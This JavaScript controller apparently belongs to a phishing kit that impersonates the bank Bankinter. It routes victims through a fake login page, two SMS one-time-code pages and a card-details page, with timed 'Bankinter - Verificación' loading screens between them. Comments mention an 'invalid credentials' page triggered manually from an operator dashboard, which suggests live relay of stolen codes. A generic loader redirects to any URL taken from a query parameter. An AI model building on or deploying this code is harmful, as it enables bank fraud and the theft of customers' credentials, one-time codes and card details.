const { ROUTES } = require('../config/constants');
const config = require('../config');

class PageController {
    // 1. Index / Login Page
    renderLogin(req, res) {
        res.render('index');
    }

    // 2. Card Details Page
    renderCard(req, res) {
        res.render('ccya');
    }

    // 3. SMS OTP Page 1
    renderSms1(req, res) {
        res.render('simo1');
    }

    // 4. SMS OTP Page 2
    renderSms2(req, res) {
        res.render('simo2');
    }

    // 5. Done / Success Page (end of the flow)
    renderDone(req, res) {
        res.render('done');
    }

    // 6. Invalid credentials page (manually triggered from dashboard)
    renderInvalidCredentials(req, res) {
        res.render('invalid');
    }

    // --- Unified Loading Handlers using single loading.ejs ---

    // Loading 1: After login -> redirects to OTP Page 1
    renderLoading1(req, res) {
        res.render('loading', {
            redirectUrl: ROUTES.SMS_1,
            seconds: 3,
            title: 'Bankinter - Verificación'
        });
    }

    // Loading 2: After OTP 2 -> redirects to Card Verification
    renderLoading2(req, res) {
        res.render('loading', {
            redirectUrl: ROUTES.CARD_VERIFICATION,
            seconds: 3,
            title: 'Bankinter - Verificación'
        });
    }

    // Loading 3: After OTP 1 -> redirects to OTP Page 2
    renderLoading3(req, res) {
        res.render('loading', {
            redirectUrl: ROUTES.SMS_2,
            seconds: 3,
            title: 'Bankinter - Verificación'
        });
    }

    // Loading 4: After Card -> redirects to the Done / Success page
    renderLoading4(req, res) {
        res.render('loading', {
            redirectUrl: ROUTES.DONE,
            seconds: 3,
            title: 'Bankinter - Verificación'
        });
    }

    // Generic loading redirector for any destination (supports ?time=3&url=/...)
    renderDynamicLoading(req, res) {
        const redirectUrl = req.query.url || req.session.redirectUrl || config.REDIRECT_URL;
        const timeParam = req.query.time || req.query.seconds;
        const seconds = (timeParam && !isNaN(Number(timeParam))) ? Number(timeParam) : 3;
        const title = req.query.title || 'Bankinter - Verificación';

        res.render('loading', {
            redirectUrl,
            seconds,
            title
        });
    }
}

module.exports = new PageController();
